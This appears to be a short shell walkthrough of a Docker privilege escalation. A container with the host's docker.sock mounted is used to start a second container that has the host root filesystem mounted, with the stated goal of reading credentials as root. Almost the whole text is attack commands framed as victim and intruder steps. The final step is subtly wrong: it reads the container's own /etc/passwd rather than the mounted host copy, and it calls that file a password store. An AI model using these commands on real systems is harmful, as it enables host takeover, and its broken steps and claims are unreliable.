# Victim has to be in the docker group
# Add victim and reboot (or log out and log back in)
sudo groupadd docker
sudo usermod -aG docker $USER

# Verify if the victim is in docker group
docker run hello-world

# If this does not work, go to
# https://docs.docker.com/engine/install/linux-postinstall/
# for the solution.

# Victim has to have docker.sock mounted
docker run -itd --name sock -v /var/run/docker.sock:/var/run/docker.sock alpine:latest

# Intruder checks if docker.sock is mounted
find / -name docker.sock

# Open the docker shell
docker exec -it sock sh

# Launch a new container in the shell via docker.sock with host root directory mounted
docker -H unix:///var/run/docker.sock run -it -v /:/test:ro -t alpine sh

# Steal password with root authority
cd /test && cat /etc/passwd
